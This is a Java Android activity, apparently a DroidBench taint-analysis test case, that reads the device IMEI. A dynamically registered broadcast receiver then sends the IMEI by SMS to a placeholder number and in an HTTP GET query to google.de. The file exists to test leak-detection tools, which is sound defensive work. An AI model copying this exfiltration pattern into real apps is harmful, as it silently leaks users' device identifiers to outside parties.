package de.ecspride;

import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.os.StrictMode;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.Menu;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * @testcase_name BroadcastReceiverLifecycle1
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail Steven.Arzt@cased.de
 * 
 * @description The sensitive data is read in onCreate() and sent out in a dynamically registered
 *   broadcast receiver.
 * @dataflow source -> imei -> sink
 * @number_of_leaks 1
 * @challenges The analysis must be able to handle the dynamic registration of broadcast
 *   receivers
 */
public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);

		if (android.os.Build.VERSION.SDK_INT > 9) {
			StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
			StrictMode.setThreadPolicy(policy);
		}
		
		String imei = ((TelephonyManager) getApplicationContext().getSystemService
				(Context.TELEPHONY_SERVICE)).getDeviceId(); //source
		
		IntentFilter filter = new IntentFilter();
		filter.addAction("de.ecspride.MyAction");
		
		registerReceiver(new MyReceiver(imei), filter);
		
		Intent intent = new Intent();
		intent.setAction("de.ecspride.MyAction");
		sendBroadcast(intent);
	}
	
	private class MyReceiver extends BroadcastReceiver {
		
		private final String deviceId;
		
		public MyReceiver(String deviceId) {
			this.deviceId = deviceId;
		}

		@Override
		public void onReceive(Context context, Intent intent) {
			Log.d("DroidBench", deviceId);
			SmsManager sms = SmsManager.getDefault();
			sms.sendTextMessage("+49 1234", null, deviceId, null, null);   //sink, leak
			try {
				connect(deviceId);
			} catch (Exception e) {
				e.printStackTrace();
			}
		}

		private void connect(String data) throws IOException {
			String URL = "http://www.google.de/search?q=";
			URL = URL.concat(data);
			java.net.URL url = new URL(URL);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection(); //sink, leak
			conn.setRequestMethod("GET");
			conn.setDoInput(true);
			// Starts the query
			conn.connect();
			Log.d(getClass().getSimpleName(), URL);

			InputStream is = conn.getInputStream();
			if (is == null)
				return;
			StringBuilder sb = new StringBuilder();
			BufferedReader br = new BufferedReader(new InputStreamReader(is));
			String line = null;
			try {
				while ((line = br.readLine()) != null)
					sb.append(line);
			} finally {
				br.close();
				is.close();
			}
			Log.d(getClass().getSimpleName(), sb.toString());
		}
		
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
